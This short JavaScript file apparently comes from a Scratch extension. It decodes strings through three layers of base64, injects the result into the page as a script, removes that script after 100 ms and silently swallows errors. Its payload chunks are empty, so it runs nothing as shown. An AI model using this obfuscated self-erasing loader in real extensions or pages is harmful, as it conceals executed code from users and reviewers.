;(function (window, Scratch) {
          'use strict';
         
          const encryptedChunks = [
            '',
            '', 
            ''
          ];
          
          try {
            const stage3 = encryptedChunks.join('');
            const stage2 = atob(stage3);
            const stage1 = atob(stage2);
            const byteString = atob(stage1);
            const bytes = new Uint8Array(byteString.length);
            for (let i = 0; i < byteString.length; i++) {
              bytes[i] = byteString.charCodeAt(i);
            }
            
            const originalCode = new TextDecoder('utf-8').decode(bytes);
            
            const script = document.createElement('script');
            script.textContent = originalCode;
            document.head.appendChild(script);
            
            setTimeout(() => {
              if (script.parentNode) {
                script.remove();
              }
            }, 100);
            
            
          } catch (error) {
          }
          
    })(window, Scratch);